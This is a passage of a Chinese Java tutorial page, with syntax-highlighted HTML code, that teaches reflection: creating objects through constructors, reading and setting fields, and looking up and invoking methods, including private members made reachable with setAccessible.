class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException </span>&#123;</span><br><span class="line">        <span class="comment">//T newInstance(Object... initargs)：根据指定的构造方法创建对象</span></span><br><span class="line">        <span class="comment">//method1();</span></span><br><span class="line">        <span class="comment">//method2();</span></span><br><span class="line">        <span class="comment">//method3();</span></span><br><span class="line">        <span class="comment">//method4();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method4</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException </span>&#123;</span><br><span class="line">        <span class="comment">//获取一个私有的构造方法并创建对象</span></span><br><span class="line">        <span class="comment">//1.获取Student类的class对象</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.itheima.myreflect3.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.获取一个私有化的构造方法.</span></span><br><span class="line">        Constructor constructor = clazz.getDeclaredConstructor(String.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//被private修饰的成员,不能直接使用的</span></span><br><span class="line">        <span class="comment">//如果用反射强行获取并使用,需要临时取消访问检查</span></span><br><span class="line">        <span class="comment">// 3.1 如果获取的Constructor对象是私有的，需要暴力反射获取访问权限后再使用</span></span><br><span class="line">        <span class="comment">// 暴力反射，获取访问权限</span></span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.创建对象</span></span><br><span class="line">        Student student = (Student) constructor.newInstance(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(student);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method3</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException </span>&#123;</span><br><span class="line">        <span class="comment">//简写格式</span></span><br><span class="line">        <span class="comment">//1.获取class对象</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.itheima.myreflect3.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.在Class类中,有一个newInstance方法,可以利用空参直接创建一个对象</span></span><br><span class="line">        Object student = clazz.newInstance();<span class="comment">//这个方法现在已经过时了,了解一下</span></span><br><span class="line"></span><br><span class="line">        System.out.println(student);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method2</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException </span>&#123;</span><br><span class="line">        <span class="comment">//1.获取class对象</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.itheima.myreflect3.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.获取构造方法对象</span></span><br><span class="line">        Constructor constructor = clazz.getConstructor();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.利用空参来创建Student的对象</span></span><br><span class="line">        Student student = (Student) constructor.newInstance();</span><br><span class="line"></span><br><span class="line">        System.out.println(student);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method1</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException </span>&#123;</span><br><span class="line">        <span class="comment">//1.获取当前类（Student）的Class对象</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.itheima.myreflect3.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.通过当前类（Student）的Class对象获取当前类（Student）的构造方法对象</span></span><br><span class="line">        <span class="comment">//1.获取当前类（Student）的Class对象</span></span><br><span class="line">        <span class="comment">//2.通过当前类（Student）的Class对象获取当前类（Student）的构造方法对象</span></span><br><span class="line">        <span class="comment">//3.利用当前类（Student）的Constructor对象的newInstance方法创建当前类（Student）的对象</span></span><br><span class="line"></span><br><span class="line">        Constructor constructor = clazz.getConstructor(String.class, <span class="keyword">int</span>.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.利用当前类（Student）的Constructor对象的newInstance方法创建当前类（Student）的对象</span></span><br><span class="line">        Student student = (Student) constructor.newInstance(<span class="string">&quot;zhangsan&quot;</span>, <span class="number">23</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(student);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li> 总结图示<br><img src="https://pic.imgdb.cn/item/639a8a30b1fccdcd36d2be1a.png" alt="image.png"></li><li> 如果能看懂是上面的图示，就能举一反三的轻松学会获取并使用<code>Field</code>对象、<code>Method</code>对象的内容。<br>不同之处：无非是反射步骤2、3调用的方法稍有不一样。 </li></ul><h3 id="2-6-获取Field对象"><a href="#2-6-获取Field对象" class="headerlink" title="2.6 获取Field对象"></a>2.6 获取Field对象</h3><p><code>Feild</code>对象是把某个类的某个属性封装成的对象</p><ul><li>API<br> <code>Field[] getFields()</code>：返回所有公共成员变量对象的数组 <ul><li>返回值：所有的公共成员变量的封装对象</li></ul></li></ul><p><code>Field[] getDeclaredFields()</code>：返回所有成员变量对象的数组 </p><ul><li>返回值：所有的成员变量（含私有）的封装对象</li></ul><p><code>Field getField(String name)</code>：返回单个公共成员变量对象 </p><ul><li>参数：属性名，不存在则报错<code>NoSuchFieldException</code></li><li>返回值：指定名称的成员变量的封装对象</li></ul><p><code>Field getDeclaredField(String name)</code>：返回单个成员变量对象 </p><ul><li>参数：方法名，不存在则报错<code>NoSuchFieldException</code></li><li>返回值：指定名称的成员变量的封装对象</li><li>注意两点 <ol><li>获取的变量必须是存在的</li><li>私有的变量需要通过暴力反射获取</li></ol></li><li>使用步骤 <ol><li> 获取当前类（<code>Student</code>）的<code>Class</code>对象 </li><li> 通过当前类（<code>Student</code>）的<code>Class</code>对象获取当前类（<code>Student</code>）的属性<code>Filed</code>对象 </li></ol></li><li> 代码<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">**</span><br><span class="line"> * 获取Field对象</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException </span>&#123;</span><br><span class="line">        method1();</span><br><span class="line">        <span class="comment">//method2();</span></span><br><span class="line">        <span class="comment">//method3();</span></span><br><span class="line">        <span class="comment">//method4();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method4</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException </span>&#123;</span><br><span class="line">        <span class="comment">//        Field getDeclaredField(String name)：返回单个成员变量对象</span></span><br><span class="line">        <span class="comment">//1.获取class对象</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.itheima.myreflect4.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.获取money成员变量</span></span><br><span class="line">        Field field = clazz.getDeclaredField(<span class="string">&quot;money&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.打印一下</span></span><br><span class="line">        System.out.println(field);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method3</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException </span>&#123;</span><br><span class="line">        <span class="comment">//        Field getField(String name)：返回单个公共成员变量对象</span></span><br><span class="line">        <span class="comment">//想要获取的成员变量必须是真实存在的</span></span><br><span class="line">        <span class="comment">//且必须是public修饰的.</span></span><br><span class="line">        <span class="comment">//1.获取class对象</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.itheima.myreflect4.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.获取name这个成员变量</span></span><br><span class="line">        <span class="comment">//Field field = clazz.getField(&quot;name&quot;);</span></span><br><span class="line">        <span class="comment">//Field field = clazz.getField(&quot;name1&quot;);</span></span><br><span class="line">        Field field = clazz.getField(<span class="string">&quot;money&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.打印一下</span></span><br><span class="line">        System.out.println(field);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method2</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//        Field[] getDeclaredFields()：返回所有成员变量对象的数组</span></span><br><span class="line">        <span class="comment">//1.获取class对象</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.itheima.myreflect4.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.获取所有的Field对象</span></span><br><span class="line">        Field[] fields = clazz.getDeclaredFields();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.遍历</span></span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            System.out.println(field);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method1</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//        Field[] getFields()：返回所有公共成员变量对象的数组</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.获取class对象</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.itheima.myreflect4.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.获取Field对象.</span></span><br><span class="line">        Field[] fields = clazz.getFields();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.遍历</span></span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            System.out.println(field);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-7-使用Field对象"><a href="#2-7-使用Field对象" class="headerlink" title="2.7 使用Field对象"></a>2.7 使用Field对象</h3><p>获取<code>Field</code>对象的目的：使用该属性（获取值/设置值，eg：stu.age = 23）</p><ul><li>API<br> <code>Object get(Object instance)</code> <ul><li> 属于<code>Field</code>类 </li><li> 作用：获取某个对象的某个属性的值 </li><li> 返回值：属性的值，因为不确定属性的类型，所以是Object </li><li> 参数：对象。因为不确定该属性属于哪个对象，所以用Object </li></ul></li></ul><p><code>void set(Object obj, Object value)</code></p><ul><li> 属于<code>Field</code>类 </li><li> 作用：设置某个对象的某个属性的值 </li><li> 返回值：没有返回值 </li><li> 参数1：对象。因为不确定该属性属于哪个对象，所以用Object </li><li> 参数2：属性的值。因为不确定属性的类型，所以用Object </li><li>使用步骤 <ol><li>获取当前类（<code>Student</code>）的Class对象</li><li>通过当前类（<code>Student</code>）的<code>Class</code>对象获取当前类（<code>Student</code>）的属性对象</li><li>利用当前类（<code>Student</code>）的属性对象的<code>get/set</code>方法获取属性值或者为属性赋值 <ul><li>如果获取的属性对象是私有的，需要暴力反射获取访问权限后再使用</li></ul></li></ol></li><li> 代码<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 利用Field对象,获取值或者修改值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InstantiationException </span>&#123;</span><br><span class="line"><span class="comment">//        Object get(Object obj) 返回由该 Field表示的字段在指定对象上的值。</span></span><br><span class="line">        <span class="comment">//method1();</span></span><br><span class="line">        <span class="comment">//method2();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method2</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, InstantiationException, IllegalAccessException </span>&#123;</span><br><span class="line">        <span class="comment">//1.获取class对象</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.itheima.myreflect4.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.获取成员变量Field的对象</span></span><br><span class="line">        Field field = clazz.getDeclaredField(<span class="string">&quot;money&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.取消一下访问检查</span></span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.调用get方法来获取值</span></span><br><span class="line">        <span class="comment">//4.1创建一个对象</span></span><br><span class="line">        Student student = (Student) clazz.newInstance();</span><br><span class="line">        <span class="comment">//4.2获取指定对象的money的值</span></span><br><span class="line">        Object o = field.get(student);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//5.打印一下</span></span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method1</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, InstantiationException, IllegalAccessException </span>&#123;</span><br><span class="line">        <span class="comment">//        void set(Object obj, Object value)：给obj对象的成员变量赋值为value</span></span><br><span class="line">        <span class="comment">//1.获取class对象</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.itheima.myreflect4.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.获取name这个Field对象</span></span><br><span class="line">        Field field = clazz.getField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.利用set方法进行赋值.</span></span><br><span class="line">        <span class="comment">//3.1先创建一个Student对象</span></span><br><span class="line">        Student student = (Student) clazz.newInstance();</span><br><span class="line">        <span class="comment">//3.2有了对象才可以给指定对象进行赋值</span></span><br><span class="line">        field.set(student,<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(student);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li> 总结图示<br><img src="https://pic.imgdb.cn/item/639a8a2cb1fccdcd36d2b78b.png" alt="image.png"> </li></ul><h3 id="2-8-获取Method对象"><a href="#2-8-获取Method对象" class="headerlink" title="2.8 获取Method对象"></a>2.8 获取Method对象</h3><p><code>Method</code>对象是把某个类的某个方法封装成的对象</p><ul><li>API<br> <code>Method[] getMethods()</code>：返回所有公共的方法对象数组 <ul><li>返回值：返回所有公共的方法（包含从父类继承的方法）对象数组</li></ul></li></ul><p><code>Method[] getDeclaredMethods()</code>：返回所有的方法对象数组 </p><ul><li>返回值：返回所有公共的方法（含私有，不含从父类继承的方法）对象数组</li></ul><p><code>Method[] getMethod(String methodName, Class... args)</code>：返回单个公共的方法对象 </p><ul><li>参数1：方法名，如果不存在，报错<code>NoSuchMethodException</code></li><li>参数2：调用方法的实参class类型列表。因为不确定多少个实参，所以用可变参数。</li><li>返回值：单个公共的方法对象</li></ul><p><code>Method[] getDeclaredMethod(String methodName, Class... args)</code>：返回单个方法对象 </p><ul><li>参数1：方法名，如果不存在，报错<code>NoSuchMethodException</code></li><li>参数2：调用方法的实参class类型列表。因为不确定多少个实参，所以用可变参数。</li><li>返回值：单个方法对象</li><li>注意两点 <ol><li>获取的方法必须是存在的</li><li>私有的方法需要通过暴力反射获取</li></ol></li><li>使用步骤 <ol><li> 获取当前类（Student）的<code>Class</code>对象 </li><li> 通过当前类（<code>Student</code>）的<code>Class</code>对象获取当前类（<code>Student</code>）的某个方法对象 </li></ol></li><li> 代码<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取Method对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException </span>&#123;</span><br><span class="line">        <span class="comment">//method1();</span></span><br><span class="line">        <span class="comment">//method2();</span></span><br><span class="line">        <span class="comment">//method3();</span></span><br><span class="line">        <span class="comment">//method4();</span></span><br><span class="line">        <span class="comment">//method5();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method5</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException </span>&#123;</span><br><span class="line">        <span class="comment">//        Method getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes)：</span></span><br><span class="line"><span class="comment">//                                返回单个成员方法对象</span></span><br><span class="line">        <span class="comment">//1.获取class对象</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.itheima.myreflect5.Student&quot;</span>);</span><br><span class="line">        <span class="comment">//2.获取一个成员方法show</span></span><br><span class="line">        Method method = clazz.getDeclaredMethod(<span class="string">&quot;show&quot;</span>);</span><br><span class="line">        <span class="comment">//3.打印一下</span></span><br><span class="line">        System.out.println(method);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method4</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException </span>&#123;</span><br><span class="line">        <span class="comment">//1.获取class对象</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.itheima.myreflect5.Student&quot;</span>);</span><br><span class="line">        <span class="comment">//2.获取一个有形参的方法function2</span></span><br><span class="line">        Method method = clazz.getMethod(<span class="string">&quot;function2&quot;</span>, String.class);</span><br><span class="line">        <span class="comment">//3.打印一下</span></span><br><span class="line">        System.out.println(method);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method3</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException </span>&#123;</span><br><span class="line">        <span class="comment">//        Method getMethod(String name, Class&lt;?&gt;... parameterTypes) ：</span></span><br><span class="line"><span class="comment">//                                返回单个公共成员方法对象</span></span><br><span class="line">        <span class="comment">//1.获取class对象</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.itheima.myreflect5.Student&quot;</span>);</span><br><span class="line">        <span class="comment">//2.获取成员方法function1</span></span><br><span class="line">        Method method1 = clazz.getMethod(<span class="string">&quot;function1&quot;</span>);</span><br><span class="line">        <span class="comment">//3.打印一下</span></span><br><span class="line">        System.out.println(method1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method2</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//        Method[] getDeclaredMethods()：</span></span><br><span class="line"><span class="comment">//        返回所有成员方法对象的数组，不包括继承的</span></span><br><span class="line">        <span class="comment">//1.获取class对象</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.itheima.myreflect5.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.获取Method对象</span></span><br><span class="line">        Method[] methods = clazz.getDeclaredMethods();</span><br><span class="line">        <span class="comment">//3.遍历一下数组</span></span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method1</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//        Method[] getMethods()：返回所有公共成员方法对象的数组，包括继承的</span></span><br><span class="line">        <span class="comment">//1.获取class对象</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.itheima.myreflect5.Student&quot;</span>);</span><br><span class="line">        <span class="comment">//2.获取成员方法对象</span></span><br><span class="line">        Method[] methods = clazz.getMethods();</span><br><span class="line">        <span class="comment">//3.遍历</span></span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-9-使用Method对象"><a href="#2-9-使用Method对象" class="headerlink" title="2.9 使用Method对象"></a>2.9 使用Method对象</h3><p>获取<code>Method</code>对象的目的：调用其封装的方法（eg:stu.study()）</p><ul><li>API<br> <code>Object invoke(Object instance, Object... args)</code> <ul><li> 属于<code>Method</code>类 </li><li> 作用：调用某个对象的某个方法 </li><li> 返回值：方法执行完的返回值。因为不确定该方法返回值类型，所以用Object。 </li><li> 参数1：调用者对象。因为不确定该方法属于哪个对象，所以用Object。 </li><li> 参数2：调用时传递的参数实参列表。不确定参数类型和个数，所以使用<code>Object</code>可变参数。 </li></ul></li><li>使用步骤 <ol><li>获取当前类（<code>Student</code>）的<code>Class</code>对象</li><li>通过当前类（<code>Student</code>）的<code>Class</code>对象获取当前类（<code>Student</code>）的某个方法<code>Method</code>对象</li><li>利用当前类（<code>Student</code>）的<code>Method</code>对象的<code>invoke</code>方法，反射调用目标方法</li><li>3.1 如果获取的Method对象是私有的，需要暴力反射获取访问权限后再使用</li><li>3.2 如果方法有返回值，会通过invoke方法的返回值来体现</li></ol></li><li> 代码<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取Method对象并运行</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException </span>&#123;</span><br><span class="line"><span class="comment">//        Object invoke(Object obj, Object... args)：运行方法</span></span><br><span class="line"><span class="comment">//        参数一：用obj对象调用该方法</span></span><br><span class="line"><span class="comment">//        参数二：调用方法的传递的参数（如果没有就不写）</span></span><br><span class="line"><span class="comment">//        返回值：方法的返回值（如果没有就不写）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.获取class对象</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.itheima.myreflect5.Student&quot;</span>);</span><br><span class="line">        <span class="comment">//2.获取里面的Method对象  function4</span></span><br><span class="line">        Method method = clazz.getMethod(<span class="string">&quot;function4&quot;</span>, String.class);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 暴力反射，之后就可以调用private方法了</span></span><br><span class="line">        <span class="comment">//method.setAccessible(true);</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//3.运行function4方法就可以了</span></span><br><span class="line">        <span class="comment">//3.1创建一个Student对象,当做方法的调用者</span></span><br><span class="line">        Student student = (Student) clazz.newInstance();</span><br><span class="line">        <span class="comment">//3.2运行方法</span></span><br><span 